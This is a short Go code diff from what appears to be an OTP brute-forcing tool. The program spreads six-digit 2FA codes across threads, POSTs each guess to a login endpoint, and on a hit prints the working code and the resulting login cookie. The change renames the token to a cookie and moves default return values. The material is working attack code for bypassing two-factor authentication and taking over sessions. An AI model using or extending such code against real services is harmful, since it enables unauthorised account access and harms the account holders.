@@ -58,6 +58,9 @@ func main() {
 }
 
 func runThreads(threadNum int) {
+	// Default return values for POST request
+	success := false
+	defaultCookie := ""
 	defer wg.Done()
 	limit := threadNum * otpTranche
 	for i := limit - otpTranche; i <= limit; i++ {
@@ -69,10 +72,10 @@ func runThreads(threadNum int) {
 			if len(otp) > 6 {
 				continue
 			} else {
-				success, token := sendPost(otp)
+				success, loginCookie := sendPost(otp, success, defaultCookie)
 				if success {
 					fmt.Println("[>>] OTP Found: " + otp)
-					fmt.Println("[>>] Login Token: " + token)
+					fmt.Println("[>>] Login Cookie: " + loginCookie)
 					finish := time.Now()
 					fmt.Println("[>] Time completed: ", finish)
 					fmt.Println("[>] Time elapsed: ", finish.Sub(start))
@@ -95,11 +98,7 @@ func generateOtp(otpInt int) string {
 	return otpStr
 }
 
-func sendPost(otp string) (bool, string) {
-	// Default return values
-	success := false
-	token := ""
-
+func sendPost(otp string, success bool, token string) (bool, string) {
 	// Create JSON body with 2FA value
 	requestBody, err := json.Marshal(map[string]string{
 		"value": otp,
